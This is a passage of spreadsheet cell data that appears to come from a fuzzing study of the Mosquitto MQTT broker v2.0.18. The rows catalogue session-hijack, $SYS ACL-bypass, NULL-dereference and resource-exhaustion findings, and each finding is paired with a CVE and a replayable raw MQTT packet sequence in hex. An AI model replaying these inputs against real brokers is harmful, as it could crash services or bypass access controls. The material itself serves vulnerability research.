      <c r="D2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DATA提取出来(161B)\u000a4.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228" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:00c2 ===\u000a大小: 884B (报告+请求数据)\u000a请求数据: 161B\u000a\u000a---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MQTT请求序列(161B原始二进制) ---\u000aMsg[1]: PUBREC PacketID=16972 | raw_header=5055424c49534820546f7069483de265\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: (不完整,34B) raw=2626262626262626262626262626262626262626262626265404023c010700000001\u000a(尾部34B): 2626262626262626262626262626262626262626262626265404023c010700000001</f>
        <v/>
      </c>
      <c r="F2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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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2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29">
      <c r="A229" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B229" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C229" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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29" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0101 ===\u000a大小: 457B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CONNECT Proto= v128 ClientID='\x07\x07\x07\x07\x07\x07b'(7B) clean_session=False keepalive=0s [持久会话] | raw_header=10130000800000000000070707070707\u000aMsg[2]: (不完整,4B) raw=69257fc8\u000a(尾部4B): 69257fc8</f>
        <v/>
      </c>
      <c r="F2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2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29" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J22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2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30">
      <c r="A230" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B230" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C230" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(91B)\u000a4.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30" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0102 ===\u000a大小: 618B (报告+请求数据)\u000a请求数据: 91B\u000a\u000a---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MQTT请求序列(91B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32110020636d642f6c69676800040000\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[3]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=65s Will=YES WillTopic='$SYS/broker/clients/connected' [自动清理会话] | raw_header=104400044d51545404b600410000001d</f>
        <v/>
      </c>
      <c r="F2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3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30" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J23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2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1">
      <c r="A231" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B231" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C231" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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231" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0103 ===\u000a大小: 752B (报告+请求数据)\u000a请求数据: 80B\u000a\u000a---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MQTT请求序列(80B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='¢,\x01®\x00\x00\x13$SYS/b' QoS=2 retain=False payload='roker/v' | raw_header=3416000da22c01ae000013245359532f\u000aMsg[2]: (不完整,56B) raw=657273696f6e0012686f6d652f2b2f74656d706572617475726500650a4000657a20006582127a7a\u000a(尾部56B): 657273696f6e0012686f6d652f2b2f74656d706572617475726500650a4000657a20006582127a7a7a7a9d747a7a7a7aa17a</f>
        <v/>
      </c>
      <c r="F2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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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3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2">
      <c r="A232" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B232" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C232" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(191B)\u000a4.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32" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0181 ===\u000a大小: 2268B (报告+请求数据)\u000a请求数据: 191B\u000a\u000a---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MQTT请求序列(191B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v54 ClientID=''(250B) clean_session=False keepalive=20730s [持久会话] | raw_header=1a350000364050fa0000fafd40804b82\u000aMsg[2]: TYPE0  | raw_header=00062b2f64617461\u000aMsg[3]: CONNACK session_present=117 reason_code=0 | raw_header=213975000d2473686172652f67727031\u000aMsg[4]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=3907e2490bc6b89529\u000aMsg[5]: TYPE0  | raw_header=0300\u000aMsg[6]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=152473686172652f6772702f74657374\u000aMsg[7]: (不完整,20B) raw=039fbf4b16f952f942df3f03400f004180404066\u000a(尾部20B): 039fbf4b16f952f942df3f03400f004180404066</f>
        <v/>
      </c>
      <c r="F2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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J23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3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33">
      <c r="A233" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B233" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C233" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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233" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0182 ===\u000a大小: 837B (报告+请求数据)\u000a请求数据: 173B\u000a\u000a---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MQTT请求序列(173B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v30 ClientID=''(102B) clean_session=True keepalive=256s [自动清理会话] | raw_header=101300044d5154541e02010000006675\u000aMsg[2]: SUBSCRIBE PacketID=875 Topics=[] | raw_header=8216036b050bfbeebc2f000b73656e73\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=95B | raw_header=337e001d245359532f62726f6b65722f</f>
        <v/>
      </c>
      <c r="F2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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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3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4">
      <c r="A234" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0183</t>
        </is>
      </c>
      <c r="B234" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C234" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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234" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0183 ===\u000a大小: 1153B (报告+请求数据)\u000a请求数据: 293B\u000a\u000a---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MQTT请求序列(293B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='te\x82&amp;\x00ù\x00\x00\x1d$SYS' QoS=0 retain=True payload='/broker' | raw_header=3116000d7465822600f900001d245359\u000aMsg[2]: CONNACK session_present=108 reason_code=105 | raw_header=2f636c69656e74732f636f6e6e656374\u000aMsg[3]: UNSUBSCRIBE  | raw_header=a90bfabff47203001d24535953\u000aMsg[4]: CONNACK session_present=114 reason_code=111 | raw_header=2f62726f6b65722f636c69656e74732f\u000aMsg[5]: (不完整,55B) raw=aef4b7f68118cd26059ff8784e7a557e0473742f72657461696e65646b6565705f6d658212000200\u000a(尾部55B): aef4b7f68118cd26059ff8784e7a557e0473742f72657461696e65646b6565705f6d6582120002000d746573742f72657461</f>
        <v/>
      </c>
      <c r="F2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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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5">
      <c r="A235" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:01c1</t>
        </is>
      </c>
      <c r="B235" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C235" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(261B)\u000a4.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235" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:01c1 ===\u000a大小: 979B (报告+请求数据)\u000a请求数据: 261B\u000a\u000a---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MQTT请求序列(261B原始二进制) ---\u000aMsg[1]: AUTH  | raw_header=f000\u000aMsg[2]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1c261600262626262626262604002626\u000aMsg[3]: CONNACK session_present=38 reason_code=32 | raw_header=26262620002626262626262626262626\u000aMsg[4]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262642262626262626\u000aMsg[6]: PUBCOMP PacketID=12067 | raw_header=70312f23101f7e539fcf0684220d44e7\u000aMsg[7]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[8]: (不完整,8B) raw=2626262626265561\u000a(尾部8B): 2626262626265561</f>
        <v/>
      </c>
      <c r="F2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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J2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3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36">
      <c r="A236" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B236" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C236" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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0x0206\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E236" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0206 ===\u000a大小: 889B (报告+请求数据)\u000a请求数据: 180B\u000a\u000a---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MQTT请求序列(180B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='fuzz_c6'(7B) clean_session=True keepalive=238s [自动清理会话] | raw_header=101300044d515454040200ee00076675\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['sensor/+/temp'(QoS=0)] | raw_header=82120001000d73656e736f722f2b2f74\u000aMsg[3]: PUBLISH Topic='sens\x82\x1c\x00O\x00\x13$SYS/br' QoS=0 retain=False payload='oker' | raw_header=3017001173656e73821c004f00132453\u000aMsg[4]: (不完整,114B) raw=2f76657273696f6e00000174003026001c2473686172652f67332f686f6d652f2b2f74656d706572\u000a(尾部114B): 2f76657273696f6e00000174003026001c2473686172652f67332f686f6d652f2b2f74656d70657261747572652526ff720a</f>
        <v/>
      </c>
      <c r="F2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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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7">
      <c r="A237" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B237" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C237" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(306B)\u000a4.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237" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0286 ===\u000a大小: 2522B (报告+请求数据)\u000a请求数据: 306B\u000a\u000a---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MQTT请求序列(306B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(20847B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101300044d5154540402003c516f6675\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['sensor/+/temS'(QoS=0)] | raw_header=82120001000d73656e736f722f2b2f74\u000aMsg[3]: PUBLISH Topic='sensor/r\x82E\x02\x87\x1f\x08ì\x8e\x8d' QoS=0 retain=False payload='\&amp;\x00\u000a' | raw_header=3017001173656e736f722f7282450287\u000aMsg[4]: PUBCOMP PacketID=29556 | raw_header=746573742f746f706963000b73656e73\u000aMsg[5]: PUBLISH Topic='cmd/light/o\x82' QoS=1 retain=False payload='\x1a\x00³' | raw_header=3211000c636d642f6c696768742f6f82\u000aMsg[6]: TYPE0  | raw_header=050be594db6100062b2f646174\u000aMsg[7]: PUBREL PacketID=6 | raw_header=610900062b2f6461746105\u000aMsg[8]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=57B | raw_header=3958001d245359532f62726f6b65722f\u000aMsg[9]: PUBREL  | raw_header=6e00\u000aMsg[10]: (不完整,2B) raw=0531\u000a(尾部2B): 0531</f>
        <v/>
      </c>
      <c r="F2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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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38">
      <c r="A238" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B238" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C238" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(434B)\u000a4.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238" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c4 ===\u000a大小: 967B (报告+请求数据)\u000a请求数据: 434B\u000a\u000a---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MQTT请求序列(434B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232262626262626262626172626\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626ff2626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=56 | raw_header=2626263826263250020f191aa6267fff\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32323232323200013232323232323232\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[6]: CONNACK session_present=38 reason_code=38 | raw_header=26262626260d26262626262626262626\u000aMsg[7]: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(不完整,10B) raw=262626262632320f6a00\u000a(尾部10B): 262626262632320f6a00</f>
        <v/>
      </c>
      <c r="F2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3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38" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J23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38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39">
      <c r="A239" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B239" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C239" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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239" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0305 ===\u000a大小: 2377B (报告+请求数据)\u000a请求数据: 190B\u000a\u000a---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MQTT请求序列(190B原始二进制) ---\u000aMsg[1]: CONNECT Proto=M/\x00\x00 v81 ClientID=''(102B) clean_session=False keepalive=21508s Will=YES [持久会话] | raw_header=101300044d2f00005154540400006675\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test¦\u000d'(QoS=2)] | raw_header=820b0001000674657374a60d02\u000aMsg[3]: SUBSCRIBE PacketID=205 Topics=['+/data'(QoS=1), '\x00\x00fuzz_c3\x82\x0b\x00\x01\x00\x06test¦\u000d\x02\x82?\x00Í\x00\x06'(QoS=3)] | raw_header=823f00cd00062b2f6461746101001c00\u000aMsg[4]: PUBREL PacketID=11055 | raw_header=652f2b2f74856d706572617475726502\u000aMsg[5]: (不完整,42B) raw=656d7000cebd8a355fb01f873b3bfbc4a89bc875340e0006746573742f6300036461746162b01f87\u000a(尾部42B): 656d7000cebd8a355fb01f873b3bfbc4a89bc875340e0006746573742f6300036461746162b01f87e000</f>
        <v/>
      </c>
      <c r="F2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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J23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3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40">
      <c r="A240" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B240" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C240" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(399B)\u000a4.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0x0385\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E240" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0385 ===\u000a大小: 4019B (报告+请求数据)\u000a请求数据: 399B\u000a\u000a---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MQTT请求序列(399B原始二进制) ---\u000aMsg[1]: CONNECT Proto=M/\x00\x00 v81 ClientID=''(102B) clean_session=False keepalive=256s [持久会话] | raw_header=101300044d2f00005100010000006675\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['sensor/+/temp'(QoS=3)] | raw_header=82120001000d73656e736f722f2b2f74\u000aMsg[3]: AUTH  | raw_header=f0170011732f726f6f6d312f74656d70\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b642f6c69fa0000fa31313131313131\u000aMsg[5]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=31313131313131313131313131313131\u000aMsg[6]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[7]: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(不完整,25B) raw=31313131313131313131313100053140e8000e00001000e000\u000a(尾部25B): 31313131313131313131313100053140e8000e00001000e000</f>
        <v/>
      </c>
      <c r="F2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4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40" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J24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4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41">
      <c r="A241" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B241" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C241" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(123B)\u000a4.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41" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0040 ===\u000a大小: 558B (报告+请求数据)\u000a请求数据: 123B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(123B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=57094 Topics=[''(零长度!QoS=0)] | raw_header=8064df06000000ff0406003c00076675\u000aMsg[2]: PINGREQ  | raw_header=c000\u000aMsg[3]: (不完整,19B) raw=7a5f63336464646464647805ffffe91f976484\u000a(尾部19B): 7a5f63336464646464647805ffffe91f976484</f>
        <v/>
      </c>
      <c r="F2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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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42">
      <c r="A242" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B242" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C242" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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42" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0042 ===\u000a大小: 692B (报告+请求数据)\u000a请求数据: 111B\u000a\u000a---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MQTT请求序列(111B原始二进制) ---\u000aMsg[1]: CONNECT Proto=METT v24 ClientID=''(26229B) clean_session=True keepalive=59s [自动清理会话] | raw_header=101300044d4554541802003bfa076675\u000aMsg[2]: SUBSCRIBE PacketID=92 Topics=['t'(QoS=0), ''(零长度!QoS=2), '$share/grp1/test/+'(QoS=2)] | raw_header=821e005c000174000000020012247368\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload='\x00]\x029ôâDÇÃE\x18\x9b5¼sU&amp;sU\x1dåÎ³ðþ0\x0cçqî\x12'\x0e\x14' | raw_header=3a370013245359532f62726f6b65722f\u000aMsg[4]: PUBCOMP  | raw_header=78</f>
        <v/>
      </c>
      <c r="F2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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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4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43">
      <c r="A243" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B243" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C243" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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43" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c0 ===\u000a大小: 732B (报告+请求数据)\u000a请求数据: 110B\u000a\u000a---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MQTT请求序列(110B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: TYPE0  | raw_header=00044d515554\u000aMsg[3]: TYPE0  | raw_header=0402003c\u000aMsg[4]: TYPE0  | raw_header=000766757a7a5f6336\u000aMsg[5]: SUBSCRIBE PacketID=37009 Topics=[''(零长度!QoS=0)] | raw_header=82129091000000206e736f722f2b2f74\u000aMsg[6]: PUBLISH Topic='test/retained' QoS=0 retain=True payload='ïJep\x00\x00\x00' | raw_header=3116000d746573742f72657461696e65\u000aMsg[7]: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(不完整,13B) raw=742f6f6e00053162020005e000\u000a(尾部13B): 742f6f6e00053162020005e000</f>
        <v/>
      </c>
      <c r="F2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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J24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44">
      <c r="A244" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B244" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C244" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(104B)\u000a4.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44" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c2 ===\u000a大小: 2353B (报告+请求数据)\u000a请求数据: 104B\u000a\u000a---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MQTT请求序列(104B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=30 Topics=[''(零长度!QoS=3)] | raw_header=8211001e00000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=54B | raw_header=354b0013245359532f62726f6b65722f\u000aMsg[3]: (不完整,8B) raw=804c1e14daff1721\u000a(尾部8B): 804c1e14daff1721</f>
        <v/>
      </c>
      <c r="F2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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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45">
      <c r="A245" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:4,cat:0141</t>
        </is>
      </c>
      <c r="B245" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C245" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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245" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0141 ===\u000a大小: 807B (报告+请求数据)\u000a请求数据: 83B\u000a\u000a---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MQTT请求序列(83B原始二进制) ---\u000aMsg[1]: PINGREQ  | raw_header=c000\u000aMsg[2]: TYPE0  | raw_header=00114d5154540402003c000766757a7a\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0)] | raw_header=820b00010000804573582f2300\u000aMsg[4]: PUBLISH Topic='tVs\x00\x00\x00' QoS=0 retain=False payload='\x7fe\x0b\x00\x01\x00\x06test/' | raw_header=301400067456730000007f650b000100\u000aMsg[5]: CONNACK session_present=0 reason_code=52 | raw_header=23020034\u000aMsg[6]: TYPE0  | raw_header=0e00\u000aMsg[7]: (不完整,21B) raw=06746573742f63000364617461fff96e737562e000\u000a(尾部21B): 06746573742f63000364617461fff96e737562e000</f>
        <v/>
      </c>
      <c r="F2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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J24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46">
      <c r="A246" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:4,cat:0143</t>
        </is>
      </c>
      <c r="B246" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C246" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(128B)\u000a4.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246" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0143 ===\u000a大小: 999B (报告+请求数据)\u000a请求数据: 128B\u000a\u000a---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MQTT请求序列(128B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=23 Topics=[''(零长度!QoS=1)] | raw_header=82070017000001231d\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=81B | raw_header=3270001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,5B) raw=ff2307ffab\u000a(尾部5B): ff2307ffab</f>
        <v/>
      </c>
      <c r="F2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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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47">
      <c r="A247" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:4,cat:01c1</t>
        </is>
      </c>
      <c r="B247" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C247" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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247" s="2">
